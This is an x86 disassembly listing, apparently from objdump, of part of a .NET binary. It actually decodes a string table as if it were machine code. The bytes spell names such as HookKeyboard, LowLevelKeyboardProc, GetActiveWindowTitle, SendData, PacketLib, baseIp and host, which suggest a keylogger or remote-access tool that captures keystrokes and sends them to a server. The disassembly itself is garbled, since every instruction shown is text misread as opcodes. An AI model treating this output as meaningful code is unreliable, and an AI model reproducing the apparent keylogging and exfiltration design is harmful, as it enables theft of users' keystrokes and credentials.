  409787:	73 74                	jae    0x4097fd
  409789:	75 72                	jne    0x4097fd
  40978b:	61                   	popa
  40978c:	00 53 65             	add    %dl,0x65(%ebx)
  40978f:	6e                   	outsb  %ds:(%esi),(%dx)
  409790:	64 44                	fs inc %esp
  409792:	61                   	popa
  409793:	74 61                	je     0x4097f6
  409795:	00 52 65             	add    %dl,0x65(%edx)
  409798:	63 65 69             	arpl   %esp,0x69(%ebp)
  40979b:	76 65                	jbe    0x409802
  40979d:	44                   	inc    %esp
  40979e:	61                   	popa
  40979f:	74 61                	je     0x409802
  4097a1:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  4097a5:	61                   	popa
  4097a6:	00 50 61             	add    %dl,0x61(%eax)
  4097a9:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4097ac:	74 4c                	je     0x4097fa
  4097ae:	69 62 00 4b 65 79 4c 	imul   $0x4c79654b,0x0(%edx),%esp
  4097b5:	69 62 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%edx),%esp
  4097bc:	72 6c                	jb     0x40982a
  4097be:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  4097c5:	65 6d                	gs insl (%dx),%es:(%edi)
  4097c7:	2e 43                	cs inc %ebx
  4097c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4097ca:	6c                   	insb   (%dx),%es:(%edi)
  4097cb:	6c                   	insb   (%dx),%es:(%edi)
  4097cc:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4097d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4097d2:	73 2e                	jae    0x409802
  4097d4:	47                   	inc    %edi
  4097d5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4097d7:	65 72 69             	gs jb  0x409843
  4097da:	63 00                	arpl   %eax,(%eax)
  4097dc:	52                   	push   %edx
  4097dd:	65 61                	gs popa
  4097df:	64 44                	fs inc %esp
  4097e1:	61                   	popa
  4097e2:	74 61                	je     0x409845
  4097e4:	41                   	inc    %ecx
  4097e5:	73 79                	jae    0x409860
  4097e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4097e8:	63 00                	arpl   %eax,(%eax)
  4097ea:	72 65                	jb     0x409851
  4097ec:	61                   	popa
  4097ed:	64 44                	fs inc %esp
  4097ef:	61                   	popa
  4097f0:	74 61                	je     0x409853
  4097f2:	41                   	inc    %ecx
  4097f3:	73 79                	jae    0x40986e
  4097f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4097f6:	63 00                	arpl   %eax,(%eax)
  4097f8:	53                   	push   %ebx
  4097f9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4097fb:	64 44                	fs inc %esp
  4097fd:	61                   	popa
  4097fe:	74 61                	je     0x409861
  409800:	41                   	inc    %ecx
  409801:	73 79                	jae    0x40987c
  409803:	6e                   	outsb  %ds:(%esi),(%dx)
  409804:	63 00                	arpl   %eax,(%eax)
  409806:	73 65                	jae    0x40986d
  409808:	6e                   	outsb  %ds:(%esi),(%dx)
  409809:	64 44                	fs inc %esp
  40980b:	61                   	popa
  40980c:	74 61                	je     0x40986f
  40980e:	41                   	inc    %ecx
  40980f:	73 79                	jae    0x40988a
  409811:	6e                   	outsb  %ds:(%esi),(%dx)
  409812:	63 00                	arpl   %eax,(%eax)
  409814:	43                   	inc    %ebx
  409815:	6f                   	outsl  %ds:(%esi),(%dx)
  409816:	6e                   	outsb  %ds:(%esi),(%dx)
  409817:	6e                   	outsb  %ds:(%esi),(%dx)
  409818:	65 63 74 41 73       	arpl   %esi,%gs:0x73(%ecx,%eax,2)
  40981d:	79 6e                	jns    0x40988d
  40981f:	63 00                	arpl   %eax,(%eax)
  409821:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  409824:	6e                   	outsb  %ds:(%esi),(%dx)
  409825:	65 63 74 41 73       	arpl   %esi,%gs:0x73(%ecx,%eax,2)
  40982a:	79 6e                	jns    0x40989a
  40982c:	63 00                	arpl   %eax,(%eax)
  40982e:	52                   	push   %edx
  40982f:	65 61                	gs popa
  409831:	64 50                	fs push %eax
  409833:	61                   	popa
  409834:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409837:	74 41                	je     0x40987a
  409839:	73 79                	jae    0x4098b4
  40983b:	6e                   	outsb  %ds:(%esi),(%dx)
  40983c:	63 00                	arpl   %eax,(%eax)
  40983e:	72 65                	jb     0x4098a5
  409840:	61                   	popa
  409841:	64 50                	fs push %eax
  409843:	61                   	popa
  409844:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409847:	74 41                	je     0x40988a
  409849:	73 79                	jae    0x4098c4
  40984b:	6e                   	outsb  %ds:(%esi),(%dx)
  40984c:	63 00                	arpl   %eax,(%eax)
  40984e:	4c                   	dec    %esp
  40984f:	6f                   	outsl  %ds:(%esi),(%dx)
  409850:	77 4c                	ja     0x40989e
  409852:	65 76 65             	gs jbe 0x4098ba
  409855:	6c                   	insb   (%dx),%es:(%edi)
  409856:	4b                   	dec    %ebx
  409857:	65 79 62             	gs jns 0x4098bc
  40985a:	6f                   	outsl  %ds:(%esi),(%dx)
  40985b:	61                   	popa
  40985c:	72 64                	jb     0x4098c2
  40985e:	50                   	push   %eax
  40985f:	72 6f                	jb     0x4098d0
  409861:	63 00                	arpl   %eax,(%eax)
  409863:	64 77 54             	fs ja  0x4098ba
  409866:	68 72 65 61 64       	push   $0x64616572
  40986b:	49                   	dec    %ecx
  40986c:	64 00 47 65          	add    %al,%fs:0x65(%edi)
  409870:	74 57                	je     0x4098c9
  409872:	69 6e 64 6f 77 54 68 	imul   $0x6854776f,0x64(%esi),%ebp
  409879:	72 65                	jb     0x4098e0
  40987b:	61                   	popa
  40987c:	64 50                	fs push %eax
  40987e:	72 6f                	jb     0x4098ef
  409880:	63 65 73             	arpl   %esp,0x73(%ebp)
  409883:	73 49                	jae    0x4098ce
  409885:	64 00 6c 70 64       	add    %ch,%fs:0x64(%eax,%esi,2)
  40988a:	77 50                	ja     0x4098dc
  40988c:	72 6f                	jb     0x4098fd
  40988e:	63 65 73             	arpl   %esp,0x73(%ebp)
  409891:	73 49                	jae    0x4098dc
  409893:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  409897:	64 44                	fs inc %esp
  409899:	61                   	popa
  40989a:	74 61                	je     0x4098fd
  40989c:	52                   	push   %edx
  40989d:	65 61                	gs popa
  40989f:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  4098a3:	64 50                	fs push %eax
  4098a5:	61                   	popa
  4098a6:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4098a9:	74 52                	je     0x4098fd
  4098ab:	65 61                	gs popa
  4098ad:	64 00 6b 65          	add    %ch,%fs:0x65(%ebx)
  4098b1:	79 62                	jns    0x409915
  4098b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4098b4:	61                   	popa
  4098b5:	64 54                	fs push %esp
  4098b7:	68 72 65 61 64       	push   $0x64616572
  4098bc:	00 69 64             	add    %ch,0x64(%ecx)
  4098bf:	54                   	push   %esp
  4098c0:	68 72 65 61 64       	push   $0x64616572
  4098c5:	00 4b 65             	add    %cl,0x65(%ebx)
  4098c8:	79 62                	jns    0x40992c
  4098ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4098cb:	61                   	popa
  4098cc:	72 64                	jb     0x409932
  4098ce:	54                   	push   %esp
  4098cf:	68 72 65 61 64       	push   $0x64616572
  4098d4:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  4098d8:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  4098dc:	64 00 69 73          	add    %ch,%fs:0x73(%ecx)
  4098e0:	41                   	inc    %ecx
  4098e1:	74 74                	je     0x409957
  4098e3:	61                   	popa
  4098e4:	63 68 65             	arpl   %ebp,0x65(%eax)
  4098e7:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  4098eb:	74 65                	je     0x409952
  4098ed:	72 6c                	jb     0x40995b
  4098ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4098f0:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4098f3:	64 00 63 6f          	add    %ah,%fs:0x6f(%ebx)
  4098f7:	73 74                	jae    0x40996d
  4098f9:	75 72                	jne    0x40996d
  4098fb:	61                   	popa
  4098fc:	2e 63 6f 73          	arpl   %ebp,%cs:0x73(%edi)
  409900:	74 75                	je     0x409977
  409902:	72 61                	jb     0x409965
  409904:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  409907:	6c                   	insb   (%dx),%es:(%edi)
  409908:	2e 63 6f 6d          	arpl   %ebp,%cs:0x6d(%edi)
  40990c:	70 72                	jo     0x409980
  40990e:	65 73 73             	gs jae 0x409984
  409911:	65 64 00 63 6f       	gs add %ah,%fs:0x6f(%ebx)
  409916:	73 74                	jae    0x40998c
  409918:	75 72                	jne    0x40998c
  40991a:	61                   	popa
  40991b:	2e 70 61             	jo,pn  0x40997f
  40991e:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409921:	74 6c                	je     0x40998f
  409923:	69 62 2e 64 6c 6c 2e 	imul   $0x2e6c6c64,0x2e(%edx),%esp
  40992a:	63 6f 6d             	arpl   %ebp,0x6d(%edi)
  40992d:	70 72                	jo     0x4099a1
  40992f:	65 73 73             	gs jae 0x4099a5
  409932:	65 64 00 67 65       	gs add %ah,%fs:0x65(%edi)
  409937:	74 5f                	je     0x409998
  409939:	43                   	inc    %ebx
  40993a:	6f                   	outsl  %ds:(%esi),(%dx)
  40993b:	6e                   	outsb  %ds:(%esi),(%dx)
  40993c:	6e                   	outsb  %ds:(%esi),(%dx)
  40993d:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  409942:	00 73 65             	add    %dh,0x65(%ebx)
  409945:	74 5f                	je     0x4099a6
  409947:	43                   	inc    %ebx
  409948:	6f                   	outsl  %ds:(%esi),(%dx)
  409949:	6e                   	outsb  %ds:(%esi),(%dx)
  40994a:	6e                   	outsb  %ds:(%esi),(%dx)
  40994b:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  409950:	00 53 65             	add    %dl,0x65(%ebx)
  409953:	6e                   	outsb  %ds:(%esi),(%dx)
  409954:	64 44                	fs inc %esp
  409956:	61                   	popa
  409957:	74 61                	je     0x4099ba
  409959:	43                   	inc    %ebx
  40995a:	6f                   	outsl  %ds:(%esi),(%dx)
  40995b:	6d                   	insl   (%dx),%es:(%edi)
  40995c:	70 6c                	jo     0x4099ca
  40995e:	65 74 65             	gs je  0x4099c6
  409961:	64 00 69 64          	add    %ch,%fs:0x64(%ecx)
  409965:	00 3c 48             	add    %bh,(%eax,%ecx,2)
  409968:	57                   	push   %edi
  409969:	49                   	dec    %ecx
  40996a:	44                   	inc    %esp
  40996b:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  409970:	61                   	popa
  409971:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  409974:	6e                   	outsb  %ds:(%esi),(%dx)
  409975:	67 46                	addr16 inc %esi
  409977:	69 65 6c 64 00 3c 43 	imul   $0x433c0064,0x6c(%ebp),%esp
  40997e:	6f                   	outsl  %ds:(%esi),(%dx)
  40997f:	6e                   	outsb  %ds:(%esi),(%dx)
  409980:	6e                   	outsb  %ds:(%esi),(%dx)
  409981:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  409986:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  40998b:	61                   	popa
  40998c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40998f:	6e                   	outsb  %ds:(%esi),(%dx)
  409990:	67 46                	addr16 inc %esi
  409992:	69 65 6c 64 00 3c 62 	imul   $0x623c0064,0x6c(%ebp),%esp
  409999:	61                   	popa
  40999a:	73 65                	jae    0x409a01
  40999c:	49                   	dec    %ecx
  40999d:	70 3e                	jo     0x4099dd
  40999f:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4099a3:	61                   	popa
  4099a4:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4099a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4099a8:	67 46                	addr16 inc %esi
  4099aa:	69 65 6c 64 00 3c 73 	imul   $0x733c0064,0x6c(%ebp),%esp
  4099b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4099b2:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4099b5:	74 3e                	je     0x4099f5
  4099b7:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4099bb:	61                   	popa
  4099bc:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4099bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4099c0:	67 46                	addr16 inc %esi
  4099c2:	69 65 6c 64 00 3c 68 	imul   $0x683c0064,0x6c(%ebp),%esp
  4099c9:	61                   	popa
  4099ca:	73 54                	jae    0x409a20
  4099cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4099cd:	45                   	inc    %ebp
  4099ce:	78 69                	js     0x409a39
  4099d0:	74 3e                	je     0x409a10
  4099d2:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4099d6:	61                   	popa
  4099d7:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4099da:	6e                   	outsb  %ds:(%esi),(%dx)
  4099db:	67 46                	addr16 inc %esi
  4099dd:	69 65 6c 64 00 3c 68 	imul   $0x683c0064,0x6c(%ebp),%esp
  4099e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4099e5:	73 74                	jae    0x409a5b
  4099e7:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  4099ec:	61                   	popa
  4099ed:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4099f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4099f1:	67 46                	addr16 inc %esi
  4099f3:	69 65 6c 64 00 3c 6b 	imul   $0x6b3c0064,0x6c(%ebp),%esp
  4099fa:	65 79 3e             	gs jns 0x409a3b
  4099fd:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  409a01:	61                   	popa
  409a02:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  409a05:	6e                   	outsb  %ds:(%esi),(%dx)
  409a06:	67 46                	addr16 inc %esi
  409a08:	69 65 6c 64 00 68 57 	imul   $0x57680064,0x6c(%ebp),%esp
  409a0f:	6e                   	outsb  %ds:(%esi),(%dx)
  409a10:	64 00 53 65          	add    %dl,%fs:0x65(%ebx)
  409a14:	6e                   	outsb  %ds:(%esi),(%dx)
  409a15:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  409a19:	70 65                	jo     0x409a80
  409a1b:	6e                   	outsb  %ds:(%esi),(%dx)
  409a1c:	64 00 68 4d          	add    %ch,%fs:0x4d(%eax)
  409a20:	6f                   	outsl  %ds:(%esi),(%dx)
  409a21:	64 00 6d 65          	add    %ch,%fs:0x65(%ebp)
  409a25:	74 68                	je     0x409a8f
  409a27:	6f                   	outsl  %ds:(%esi),(%dx)
  409a28:	64 00 48 6f          	add    %cl,%fs:0x6f(%eax)
  409a2c:	6f                   	outsl  %ds:(%esi),(%dx)
  409a2d:	6b 4b 65 79          	imul   $0x79,0x65(%ebx),%ecx
  409a31:	62 6f 61             	bound  %ebp,0x61(%edi)
  409a34:	72 64                	jb     0x409a9a
  409a36:	00 73 6f             	add    %dh,0x6f(%ebx)
  409a39:	75 72                	jne    0x409aad
  409a3b:	63 65 00             	arpl   %esp,0x0(%ebp)
  409a3e:	76 6b                	jbe    0x409aab
  409a40:	43                   	inc    %ebx
  409a41:	6f                   	outsl  %ds:(%esi),(%dx)
  409a42:	64 65 00 77 53       	fs add %dh,%gs:0x53(%edi)
  409a47:	63 61 6e             	arpl   %esp,0x6e(%ecx)
  409a4a:	43                   	inc    %ebx
  409a4b:	6f                   	outsl  %ds:(%esi),(%dx)
  409a4c:	64 65 00 73 63       	fs add %dh,%gs:0x63(%ebx)
  409a51:	61                   	popa
  409a52:	6e                   	outsb  %ds:(%esi),(%dx)
  409a53:	43                   	inc    %ebx
  409a54:	6f                   	outsl  %ds:(%esi),(%dx)
  409a55:	64 65 00 75 43       	fs add %dh,%gs:0x43(%ebp)
  409a5a:	6f                   	outsl  %ds:(%esi),(%dx)
  409a5b:	64 65 00 6b 65       	fs add %ch,%gs:0x65(%ebx)
  409a60:	79 43                	jns    0x409aa5
  409a62:	6f                   	outsl  %ds:(%esi),(%dx)
  409a63:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  409a68:	6d                   	insl   (%dx),%es:(%edi)
  409a69:	70 72                	jo     0x409add
  409a6b:	65 73 73             	gs jae 0x409ae1
  409a6e:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  409a75:	00 53 65             	add    %dl,0x65(%ebx)
  409a78:	6c                   	insb   (%dx),%es:(%edi)
  409a79:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  409a7e:	64 65 00 45 78       	fs add %al,%gs:0x78(%ebp)
  409a83:	63 68 61             	arpl   %ebp,0x61(%eax)
  409a86:	6e                   	outsb  %ds:(%esi),(%dx)
  409a87:	67 65 00 6e 75       	add    %ch,%gs:0x75(%bp)
  409a8c:	6c                   	insb   (%dx),%es:(%edi)
  409a8d:	6c                   	insb   (%dx),%es:(%edi)
  409a8e:	43                   	inc    %ebx
  409a8f:	61                   	popa
  409a90:	63 68 65             	arpl   %ebp,0x65(%eax)
  409a93:	00 45 6e             	add    %al,0x6e(%ebp)
  409a96:	64 49                	fs dec %ecx
  409a98:	6e                   	outsb  %ds:(%esi),(%dx)
  409a99:	76 6f                	jbe    0x409b0a
  409a9b:	6b 65 00 42          	imul   $0x42,0x0(%ebp),%esp
  409a9f:	65 67 69 6e 49 6e 76 	imul   $0x6b6f766e,%gs:0x49(%bp),%ebp
  409aa6:	6f 6b 
  409aa8:	65 00 49 44          	add    %cl,%gs:0x44(%ecx)
  409aac:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  409ab3:	6c                   	insb   (%dx),%es:(%edi)
  409ab4:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  409ab8:	74 41                	je     0x409afb
  409aba:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  409abe:	65 57                	gs push %edi
  409ac0:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  409ac7:	74 6c                	je     0x409b35
  409ac9:	65 00 43 75          	add    %al,%gs:0x75(%ebx)
  409acd:	72 72                	jb     0x409b41
  409acf:	65 6e                	outsb  %gs:(%esi),(%dx)
  409ad1:	74 41                	je     0x409b14
  409ad3:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  409ad7:	65 57                	gs push %edi
  409ad9:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  409ae0:	74 6c                	je     0x409b4e
  409ae2:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409ae6:	74 5f                	je     0x409b47
  409ae8:	4d                   	dec    %ebp
  409ae9:	61                   	popa
  409aea:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  409af1:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  409af5:	6f                   	outsl  %ds:(%esi),(%dx)
  409af6:	63 65 73             	arpl   %esp,0x73(%ebp)
  409af9:	73 4d                	jae    0x409b48
  409afb:	6f                   	outsl  %ds:(%esi),(%dx)
  409afc:	64 75 6c             	fs jne 0x409b6b
  409aff:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409b03:	74 5f                	je     0x409b64
  409b05:	4e                   	dec    %esi
  409b06:	61                   	popa
  409b07:	6d                   	insl   (%dx),%es:(%edi)
  409b08:	65 00 66 75          	add    %ah,%gs:0x75(%esi)
  409b0c:	6c                   	insb   (%dx),%es:(%edi)
  409b0d:	6c                   	insb   (%dx),%es:(%edi)
  409b0e:	4e                   	dec    %esi
  409b0f:	61                   	popa
  409b10:	6d                   	insl   (%dx),%es:(%edi)
  409b11:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  409b15:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409b18:	74 4f                	je     0x409b69
  409b1a:	70 74                	jo     0x409b90
  409b1c:	69 6f 6e 4e 61 6d 65 	imul   $0x656d614e,0x6e(%edi),%ebp
  409b23:	00 47 65             	add    %al,0x65(%edi)
  409b26:	74 4e                	je     0x409b76
  409b28:	61                   	popa
  409b29:	6d                   	insl   (%dx),%es:(%edi)
  409b2a:	65 00 72 65          	add    %dh,%gs:0x65(%edx)
  409b2e:	71 75                	jno    0x409ba5
  409b30:	65 73 74             	gs jae 0x409ba7
  409b33:	65 64 41             	gs fs inc %ecx
  409b36:	73 73                	jae    0x409bab
  409b38:	65 6d                	gs insl (%dx),%es:(%edi)
  409b3a:	62 6c 79 4e          	bound  %ebp,0x4e(%ecx,%edi,2)
  409b3e:	61                   	popa
  409b3f:	6d                   	insl   (%dx),%es:(%edi)
  409b40:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  409b44:	6d                   	insl   (%dx),%es:(%edi)
  409b45:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  409b4a:	65 54                	gs push %esp
  409b4c:	69 6d 65 00 74 69 6d 	imul   $0x6d697400,0x65(%ebp),%ebp
  409b53:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
  409b57:	6c                   	insb   (%dx),%es:(%edi)
  409b58:	75 65                	jne    0x409bbf
  409b5a:	54                   	push   %esp
  409b5b:	79 70                	jns    0x409bcd
  409b5d:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  409b61:	6f                   	outsl  %ds:(%esi),(%dx)
  409b62:	74 6f                	je     0x409bd3
  409b64:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  409b67:	54                   	push   %esp
  409b68:	79 70                	jns    0x409bda
  409b6a:	65 00 75 4d          	add    %dh,%gs:0x4d(%ebp)
  409b6e:	61                   	popa
  409b6f:	70 54                	jo     0x409bc5
  409b71:	79 70                	jns    0x409be3
  409b73:	65 00 50 61          	add    %dl,%gs:0x61(%eax)
  409b77:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409b7a:	74 54                	je     0x409bd0
  409b7c:	79 70                	jns    0x409bee
  409b7e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409b82:	74 5f                	je     0x409be3
  409b84:	70 61                	jo     0x409be7
  409b86:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409b89:	74 54                	je     0x409bdf
  409b8b:	79 70                	jns    0x409bfd
  409b8d:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  409b91:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409b94:	74 54                	je     0x409bea
  409b96:	79 70                	jns    0x409c08
  409b98:	65 00 63 75          	add    %ah,%gs:0x75(%ebx)
  409b9c:	6c                   	insb   (%dx),%es:(%edi)
  409b9d:	74 75                	je     0x409c14
  409b9f:	72 65                	jb     0x409c06
  409ba1:	00 43 6c             	add    %al,0x6c(%ebx)
  409ba4:	6f                   	outsl  %ds:(%esi),(%dx)
  409ba5:	73 65                	jae    0x409c0c
  409ba7:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  409bab:	70 6f                	jo     0x409c1c
  409bad:	73 65                	jae    0x409c14
  409baf:	00 4d 75             	add    %cl,0x75(%ebp)
  409bb2:	6c                   	insb   (%dx),%es:(%edi)
  409bb3:	74 69                	je     0x409c1e
  409bb5:	63 61 73             	arpl   %esp,0x73(%ecx)
  409bb8:	74 44                	je     0x409bfe
  409bba:	65 6c                	gs insb (%dx),%es:(%edi)
  409bbc:	65 67 61             	gs addr16 popa
  409bbf:	74 65                	je     0x409c26
  409bc1:	00 47 65             	add    %al,0x65(%edi)
  409bc4:	74 4b                	je     0x409c11
  409bc6:	65 79 62             	gs jns 0x409c2b
  409bc9:	6f                   	outsl  %ds:(%esi),(%dx)
  409bca:	61                   	popa
  409bcb:	72 64                	jb     0x409c31
  409bcd:	53                   	push   %ebx
  409bce:	74 61                	je     0x409c31
  409bd0:	74 65                	je     0x409c37
  409bd2:	00 6c 70 4b          	add    %ch,0x4b(%eax,%esi,2)
  409bd6:	65 79 53             	gs jns 0x409c2c
  409bd9:	74 61                	je     0x409c3c
  409bdb:	74 65                	je     0x409c42
  409bdd:	00 47 65             	add    %al,0x65(%edi)
  409be0:	74 4b                	je     0x409c2d
  409be2:	65 79 53             	gs jns 0x409c38
  409be5:	74 61                	je     0x409c48
  409be7:	74 65                	je     0x409c4e
  409be9:	00 57 72             	add    %dl,0x72(%edi)
  409bec:	69 74 65 00 43 6f 6d 	imul   $0x706d6f43,0x0(%ebp,%eiz,2),%esi
  409bf3:	70 
  409bf4:	69 6c 65 72 47 65 6e 	imul   $0x656e6547,0x72(%ebp,%eiz,2),%ebp
  409bfb:	65 
  409bfc:	72 61                	jb     0x409c5f
  409bfe:	74 65                	je     0x409c65
  409c00:	64 41                	fs inc %ecx
  409c02:	74 74                	je     0x409c78
  409c04:	72 69                	jb     0x409c6f
  409c06:	62 75 74             	bound  %esi,0x74(%ebp)
  409c09:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  409c0d:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  409c14:	62 
  409c15:	75 74                	jne    0x409c8b
  409c17:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  409c1c:	75 67                	jne    0x409c85
  409c1e:	67 61                	addr16 popa
  409c20:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  409c24:	74 74                	je     0x409c9a
  409c26:	72 69                	jb     0x409c91
  409c28:	62 75 74             	bound  %esi,0x74(%ebp)
  409c2b:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  409c2f:	6d                   	insl   (%dx),%es:(%edi)
  409c30:	56                   	push   %esi
  409c31:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  409c38:	74 74                	je     0x409cae
  409c3a:	72 69                	jb     0x409ca5
  409c3c:	62 75 74             	bound  %esi,0x74(%ebp)
  409c3f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409c43:	73 65                	jae    0x409caa
  409c45:	6d                   	insl   (%dx),%es:(%edi)
  409c46:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  409c4a:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  409c51:	72 
  409c52:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  409c59:	73 73                	jae    0x409cce
  409c5b:	65 6d                	gs insl (%dx),%es:(%edi)
  409c5d:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  409c61:	72 61                	jb     0x409cc4
  409c63:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  409c66:	61                   	popa
  409c67:	72 6b                	jb     0x409cd4
  409c69:	41                   	inc    %ecx
  409c6a:	74 74                	je     0x409ce0
  409c6c:	72 69                	jb     0x409cd7
  409c6e:	62 75 74             	bound  %esi,0x74(%ebp)
  409c71:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  409c76:	67 65 74 46          	addr16 gs je 0x409cc0
  409c7a:	72 61                	jb     0x409cdd
  409c7c:	6d                   	insl   (%dx),%es:(%edi)
  409c7d:	65 77 6f             	gs ja  0x409cef
  409c80:	72 6b                	jb     0x409ced
  409c82:	41                   	inc    %ecx
  409c83:	74 74                	je     0x409cf9
  409c85:	72 69                	jb     0x409cf0
  409c87:	62 75 74             	bound  %esi,0x74(%ebp)
  409c8a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409c8e:	73 65                	jae    0x409cf5
  409c90:	6d                   	insl   (%dx),%es:(%edi)
  409c91:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  409c95:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  409c9c:	69 
  409c9d:	6f                   	outsl  %ds:(%esi),(%dx)
  409c9e:	6e                   	outsb  %ds:(%esi),(%dx)
  409c9f:	41                   	inc    %ecx
  409ca0:	74 74                	je     0x409d16
  409ca2:	72 69                	jb     0x409d0d
  409ca4:	62 75 74             	bound  %esi,0x74(%ebp)
  409ca7:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409cab:	73 65                	jae    0x409d12
  409cad:	6d                   	insl   (%dx),%es:(%edi)
  409cae:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  409cb2:	6f                   	outsl  %ds:(%esi),(%dx)
  409cb3:	6e                   	outsb  %ds:(%esi),(%dx)
  409cb4:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  409cba:	74 69                	je     0x409d25
  409cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  409cbd:	6e                   	outsb  %ds:(%esi),(%dx)
  409cbe:	41                   	inc    %ecx
  409cbf:	74 74                	je     0x409d35
  409cc1:	72 69                	jb     0x409d2c
  409cc3:	62 75 74             	bound  %esi,0x74(%ebp)
  409cc6:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409cca:	73 65                	jae    0x409d31
  409ccc:	6d                   	insl   (%dx),%es:(%edi)
  409ccd:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  409cd1:	65 73 63             	gs jae 0x409d37
  409cd4:	72 69                	jb     0x409d3f
  409cd6:	70 74                	jo     0x409d4c
